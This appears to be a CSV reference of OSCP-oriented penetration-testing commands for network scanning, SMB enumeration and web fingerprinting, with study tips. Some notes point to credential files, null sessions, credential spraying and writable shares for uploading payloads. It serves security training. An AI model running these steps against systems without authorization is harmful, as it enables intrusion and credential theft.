"id","name","category","command","description","subcategory","notes","oscp_relevance"
"nmap-ping-sweep","Network Ping Sweep","recon","nmap -sn <TARGET_SUBNET>","Discover live hosts on a network without port scanning","","Use -sn for host discovery only, no port scan","high"
"nmap-quick-scan","Quick Full Port Scan","recon","nmap -Pn -p- --min-rate=<RATE> <TARGET> -oA <OUTPUT>","Fast scan of all 65535 ports","","Adjust --min-rate based on network stability","high"
"nmap-service-scan","Service Version Detection","recon","nmap -sV -sC -p <PORTS> <TARGET> -oA <OUTPUT>","Detailed service enumeration with default scripts","","Use after quick scan to investigate open ports","high"
"nmap-vuln-scan","Vulnerability Scan","recon","nmap --script vuln -p <PORTS> <TARGET>","Run vulnerability detection scripts","","Can be slow, use specific scripts for better performance","medium"
"dns-enum","DNS Enumeration","recon","dnsrecon -d <DOMAIN> -t std","Standard DNS enumeration","","Try zone transfer with -t axfr if allowed","medium"
"smb-enum","SMB Enumeration","recon","enum4linux -a <TARGET>","Comprehensive SMB/NetBIOS enumeration","","Check for null sessions and guest access","high"
"snmp-enum","SNMP Enumeration","recon","snmpwalk -c <SNMP_COMMUNITY> -v2c <TARGET>","SNMP enumeration with community string","","Try 'public' and 'private' as default community strings","medium"
"smb-null-session-shares","SMB Null Session Share Enumeration","recon","smbclient -N -L //<TARGET>","Enumerate SMB shares using null session authentication (anonymous access without credentials)","","Null sessions often allowed on older Windows (pre-2000) and misconfigured Samba servers.

This is the first step in SMB enumeration - always try before authenticated methods.

Document all discovered shares in enumeration.md.

Time estimate:
1-2 minutes.

OSCP tip:
If null session works, try accessing IPC$ for further enumeration with rpcclient.","high"
"smb-enum4linux-full","Comprehensive SMB Enumeration with enum4linux","recon","enum4linux -a <TARGET>","Comprehensive SMB/NetBIOS enumeration including users, shares, groups, password policy, OS info, and workgroup details","","enum4linux wraps multiple Samba tools (smbclient, rpcclient, net).

Best used after confirming SMB is accessible.

Time estimate:
3-5 minutes for full scan.

Can be noisy - IDS may detect.

Document findings in enumeration.md:
workgroup name, users, shares, password policy (useful for credential attacks).

OSCP tip:
Look for shares with READ/WRITE access, weak password policies (no complexity, no lockout), and user lists for credential spraying.","high"
"smb-crackmapexec-shares","CrackMapExec SMB Share Enumeration","recon","crackmapexec smb <TARGET> -u <USERNAME> -p <PASSWORD> --shares","Enumerate SMB shares with authenticated access using CrackMapExec, showing detailed permission information","","CrackMapExec is faster than enum4linux for share enumeration with known credentials.

Shows explicit READ/WRITE permissions which is critical for exploitation planning.

Time estimate:
30 seconds.

OSCP tip:
Look for non-standard shares (anything besides C$, ADMIN$, IPC$) and shares with WRITE access - potential for uploading payloads.

For null session:
crackmapexec smb <TARGET> -u '' -p '' --shares.

For multiple targets:
crackmapexec smb <SUBNET> -u <USER> -p <PASS> --shares","high"
"smb-smbclient-connect","Interactive SMB Client Connection","recon","smbclient //<TARGET>/<SHARE> -U <USERNAME>","Connect interactively to an SMB share for manual file browsing, downloading, and uploading","","Interactive mode allows manual exploration which may reveal files missed by automated tools.

Common useful commands:
ls, cd, get, put, mget, mput, recurse, prompt.

Time estimate:
5-15 minutes for manual exploration.

OSCP tips:
(1) Check for readable files in Users directories - look for Desktop, Documents, Downloads.

(2) Check for writable directories - potential for malware upload.

(3) Look for configuration files, scripts, passwords in plaintext.

(4) For null session:
smbclient //<TARGET>/<SHARE> -N.

(5) For scripting:
smbclient //<TARGET>/<SHARE> -U <USER>%<PASS> -c 'ls;get file.txt'","high"
"smb-smbmap-recursive","Recursive SMB Share Content Enumeration","recon","smbmap -H <TARGET> -u <USERNAME> -p <PASSWORD> -R <SHARE>","Recursively list all files and directories within an SMB share with detailed permissions","","smbmap shows file sizes and permissions which helps prioritize targets.

Use -A flag with patterns to search for specific file types.

Time estimate:
2-5 minutes depending on share size.

OSCP tips:
(1) Look for READ/WRITE directories - potential pivot points.

(2) Common sensitive files:
passwords.txt, users.txt, config.xml, web.config, *.ps1, *.kdbx (KeePass), id_rsa (SSH keys).

(3) Use download:
smbmap -H <TARGET> -u <USER> -p <PASS> --download '<SHARE>\full\path\file.txt'.

(4) For null session:
smbmap -H <TARGET> -u '' -p ''.

(5) Recursively list ALL shares:
smbmap -H <TARGET> -u <USER> -p <PASS> -R (no share specified)","high"
"smb-mount-share","Mount SMB Share Locally","recon","sudo mount -t cifs -o username=<USERNAME>,password=<PASSWORD> //<TARGET>/<SHARE> <MOUNT_POINT>","Mount an SMB share to local filesystem for direct file access and manipulation using standard Linux tools","","Mounting allows using standard Linux tools (grep, find, cat, cp) instead of SMB-specific commands.

Much faster for bulk file operations.

Time estimate:
1 minute to mount.

OSCP tips:
(1) Always create mount point first:
sudo mkdir -p /mnt/smb.

(2) For null session:
username=guest,password='' or username='',password=''.

(3) For guest:
username=guest,password=guest.

(4) Unmount when done:
sudo umount <MOUNT_POINT>.

(5) Check what's mounted:
df -h | grep cifs.

(6) Force unmount if stuck:
sudo umount -f <MOUNT_POINT>.

(7) Use find for sensitive files:
find /mnt/smb -iname '*password*' -o -iname '*.config' -o -iname 'id_rsa'","high"
"curl-header-enum","HTTP Header Enumeration","recon","curl -I -X <METHOD> http://<TARGET>:<PORT>/<PATH>","Enumerate HTTP response headers to identify server technology, versions, and potential security misconfigurations","","Headers often reveal:
Server version (Apache/2.4.41), Backend technology (X-Powered-By:
PHP/7.4.3, ASP.NET), Framework (X-AspNet-Version), WAF presence (X-Sucuri-ID).

Time estimate:
10 seconds.

OSCP tips:
(1) Look for outdated versions - searchsploit material.

(2) X-Powered-By reveals backend language - useful for payload selection.

(3) Test OPTIONS method:
curl -I -X OPTIONS http://<TARGET> - may reveal PUT/DELETE allowed.

(4) Missing security headers = potential vulnerabilities:
X-Frame-Options, X-XSS-Protection, Content-Security-Policy.

(5) For HTTPS:
curl -I -k https://<TARGET> (bypass cert verification).

(6) Verbose for debugging:
curl -I -v http://<TARGET>","high"
"whatweb-technology-detection","Web Technology Fingerprinting","recon","whatweb -v -a 3 http://<TARGET>:<PORT>","Identify web technologies, CMS platforms, frameworks, JavaScript libraries, server info, and versions","","whatweb identifies:
CMS (WordPress, Joomla, Drupal), Web servers (Apache, nginx, IIS), Languages (PHP, ASP.NET, Python), Frameworks (Laravel, Django, Rails), JavaScript libraries (jQuery, Bootstrap), WAFs, Analytics.

Time estimate:
30-60 seconds.

OSCP tips:
(1) Prioritize CMS detection - WordPress/Joomla often have known vulns.

(2) Version numbers critical - check searchsploit immediately.

(3) For multiple URLs:
whatweb -i urls.txt.

(4) Check both HTTP and HTTPS:
whatweb http://<TARGET> https://<TARGET>.

(5) Look for development/staging indicators:
X-Debug, X-Error, verbose error messages.

(6) Admin panels:
/wp-admin (WordPress), /administrator (Joomla), /admin","high"
